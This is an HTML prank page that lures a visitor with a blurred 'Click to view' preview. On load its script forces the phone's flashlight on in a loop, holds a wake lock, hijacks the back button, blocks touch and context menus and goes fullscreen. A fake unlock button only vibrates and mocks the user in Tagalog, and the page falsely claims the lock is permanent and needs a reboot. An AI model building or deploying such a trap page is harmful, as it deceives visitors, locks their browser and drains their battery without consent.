<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            font-family: 'Courier New', monospace;
            color: #fff;
            overflow: hidden;
            user-select: none;
            touch-action: none;
        }
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.92);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
            text-align: center;
        }
        .overlay h1 {
            font-size: 28px;
            color: #ff0066;
            text-shadow: 0 0 40px #ff006688;
            margin-bottom: 16px;
        }
        .overlay p {
            color: #8899aa;
            font-size: 16px;
            max-width: 320px;
            margin-bottom: 30px;
        }
        .overlay .btn {
            background: #ff0066;
            border: none;
            color: #fff;
            padding: 16px 40px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 80%;
            max-width: 280px;
        }
        .overlay .btn:active { transform: scale(0.95); }
        .overlay .small {
            margin-top: 20px;
            font-size: 12px;
            color: #445566;
        }
        .overlay .small a {
            color: #00ffcc;
            text-decoration: underline;
        }
        .hidden-trap { display: none; }
        
        /* Blurred preview background — matches OG image */
        .blur-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDAiIGhlaWdodD0iNjAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMjIyIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtc2l6ZT0iMzAiIGZpbGw9IiM1NTUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGR5PSIuM2VtIj7wn5GqIENsaWNrIHRvIHZpZXc8L3RleHQ+PC9zdmc+') no-repeat center/cover;
            filter: blur(20px);
            z-index: 0;
        }
        .overlay { z-index: 1; }
    </style>
</head>
<body>

<!-- Blurred background for realism -->
<div class="blur-bg"></div>

<!-- The trap overlay -->
<div class="overlay" id="mainOverlay">
    <h1>🔦 LIGHT LOCKED</h1>
    <p>Your flashlight is now <strong style="color:#ff0066;">permanently ON</strong> MATULOG KANA PURO KA CELLPHONE!.</p>
    <button class="btn" id="fakeUnlockBtn">💡 TRY TO UNLOCK</button>
    <div class="small">🔒 This action is irreversible. <br> <span id="counterDisplay">ARAY KO PAKAK.</span></div>
</div>

<!-- Hidden video for torch -->
<video id="video" autoplay playsinline style="display:none;"></video>

<script>
    // ===== CONFIG =====
    let stream = null;
    let track = null;
    let isLightOn = false;
    let lockInterval = null;

    // ===== FLASHLIGHT =====
    async function forceFlashlightOn() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            track = stream.getVideoTracks()[0];
            await track.applyConstraints({
                advanced: [{ torch: true }]
            });
            isLightOn = true;

            lockInterval = setInterval(async () => {
                if (track && isLightOn) {
                    try {
                        await track.applyConstraints({
                            advanced: [{ torch: true }]
                        });
                    } catch (e) {}
                }
            }, 300);

            if (navigator.wakeLock) {
                try {
                    await navigator.wakeLock.request('screen');
                } catch (e) {}
            }

        } catch (err) {
            alert('❌ Flashlight access denied. Use a mobile device with a flash and HTTPS.');
        }
    }

    // ===== PREVENT UNLOCK =====
    function blockUnlock() {
        document.getElementById('fakeUnlockBtn').addEventListener('click', function() {
            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
            const p = document.querySelector('.overlay p');
            p.innerHTML = '❌ <strong style="color:#ff4466;">Access denied.</strong> Premium unlock failed. <br>Charge mo nalang Cellphone mo para di malobat ☺.';
            p.style.color = '#ff4466';
            if (!isLightOn) forceFlashlightOn();
        });
    }

    // ===== PREVENT BACK/BROWSER CLOSE =====
    function lockBrowser() {
        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function () {
            history.pushState(null, null, location.href);
        });

        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });

        document.addEventListener('contextmenu', e => e.preventDefault());

        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen().catch(() => {});
        }
    }

    // ===== COUNTER =====
    let counter = 0;
    setInterval(() => {
        counter++;
        document.getElementById('counterDisplay').textContent = `⏳ Light locked for ${counter}s — reboot required.`;
    }, 1000);

    // ===== INIT =====
    (async function() {
        await forceFlashlightOn();
        blockUnlock();
        lockBrowser();

        setTimeout(() => {
            const overlay = document.getElementById('mainOverlay');
            const h1 = overlay.querySelector('h1');
            h1.textContent = '🔒 LIGHT PERMANENTLY LOCKED';
            const p = overlay.querySelector('p');
            p.innerHTML = 'This device has been <strong style="color:#ff0066;">flashlight-locked</strong>.<br>WAG KANG KABAHAN HINDI TO VIRUS 😁.';
        }, 3000);
    })();

    // ===== FALLBACK =====
    setTimeout(() => {
        if (!isLightOn) {
            document.body.style.background = '#ffffff';
            document.body.style.color = '#000';
            document.querySelector('.overlay').style.background = 'rgba(255,255,255,0.95)';
            document.querySelector('.overlay h1').style.color = '#000';
            document.querySelector('.overlay p').style.color = '#333';
            document.querySelector('.overlay .btn').style.background = '#000';
            document.querySelector('.overlay .btn').style.color = '#fff';
        }
    }, 2000);
</script>
</body>
</html>
